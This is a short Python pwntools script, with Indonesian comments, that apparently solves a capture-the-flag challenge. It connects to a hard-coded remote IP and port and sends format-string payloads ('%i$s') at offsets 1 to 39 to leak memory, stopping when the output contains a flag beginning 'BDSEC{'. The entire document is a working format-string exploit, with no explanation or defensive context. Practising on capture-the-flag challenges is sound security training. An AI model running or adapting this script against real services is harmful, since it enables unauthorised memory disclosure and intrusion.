from pwn import *

# Konfigurasi koneksi
host = "45.33.118.86"
port = 9992

# Rentang offset yang akan diuji
for i in range(1, 40):
    try:
        print(f"[*] Trying offset {i} ...")
        conn = remote(host, port)
        conn.recvuntil(b"Enter your input: ")
        
        # Gunakan format string untuk mencoba leak
        payload = f"%{i}$s"
        conn.sendline(payload)
        
        # Terima semua output
        res = conn.recvall(timeout=2)
        decoded = res.decode(errors="ignore")
        
        print(f"[+] Offset {i} result:\n{decoded}\n")
        
        # Jika ditemukan flag, hentikan loop
        if "BDSEC{" in decoded:
            print("[🎉] Flag found!")
            break

        conn.close()

    except Exception as e:
        print(f"[!] Error at offset {i}: {e}")
